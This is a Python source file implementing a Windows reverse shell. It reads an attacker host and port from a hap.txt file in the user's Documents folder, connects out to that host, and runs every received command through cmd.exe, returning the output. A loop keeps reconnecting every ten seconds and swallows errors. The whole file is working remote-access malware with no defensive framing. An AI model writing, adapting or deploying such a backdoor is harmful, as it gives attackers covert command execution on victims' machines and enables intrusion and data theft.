from socket import socket
from getpass import getuser
from time import sleep
import subprocess, os, re

def change_directory(path):
    try:
        os.chdir(path)
    except FileNotFoundError:
        return "Directory does not exists\n"
    except PermissionError:
        return "Permission Denied\n"

def get_host_and_port():
    username = getuser()
    documents_path = os.path.join("C:\\Users", username, "Documents")
    file_path = os.path.join(documents_path, "hap.txt")
    if os.path.exists(file_path):
        with open(file_path, "r+") as file:
            content = file.read()
            pattern = patron = r"host\s*=\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s*\nport\s*=\s*(\d+)"
            result = re.search(pattern, content)

            if result:
                values = (result.group(1), result.group(2))
                return values
def conn():
    with socket() as s:
        values = get_host_and_port()
        s.connect((values[0], int(values[1])))
        s.sendall(bytes("[+] Connection Established\n", encoding="utf-8"))
        while True:
            s.sendall(bytes("> ", encoding="utf-8"))
            data = s.recv(1024)
            data = data.decode(encoding="utf-8")
            if data == "exit\n":
                output = "[-] Closing Connection\n"
                s.sendall(bytes(output, encoding="utf-8"))
                break
            elif data.startswith("cd"):
                path = data.split(" ", 1)[1].strip() if len(data.split(" ", 1)) > 1 else None
                if not path:
                    output = os.getcwd()
                else:
                    output = change_directory(path)
            else:
                command = subprocess.run(["cmd.exe", "/C", data],
                                         capture_output=True,
                                         shell=True,
                                         text=True,
                                         universal_newlines=True)
                output = "Output:\n" + command.stdout
            if output:
                s.sendall(bytes(output, encoding="utf-8"))
if __name__ == "__main__":
##    with socket() as s:
##        values = get_host_and_port()
##        s.connect((values[0], int(values[1])))
##        s.sendall(bytes("[+] Connection Established\n", encoding="utf-8"))
##        while True:
##            s.sendall(bytes("> ", encoding="utf-8"))
##            data = s.recv(1024)
##            data = data.decode(encoding="utf-8")
##            if data == "exit\n":
##                output = "[-] Closing Connection\n"
##                s.sendall(bytes(output, encoding="utf-8"))
##                break
##            elif data.startswith("cd"):
##                path = data.split(" ", 1)[1].strip() if len(data.split(" ", 1)) > 1 else None
##                if not path:
##                    output = os.getcwd()
##                else:
##                    output = change_directory(path)
##            else:
##                command = subprocess.run(["cmd.exe", "/C", data],
##                                         capture_output=True,
##                                         shell=True,
##                                         text=True,
##                                         universal_newlines=True)
##                output = "Output:\n" + command.stdout
##            if output:
##                s.sendall(bytes(output, encoding="utf-8"))
    while True:
        try:
            conn()
        except:
            sleep(10)
            conn()
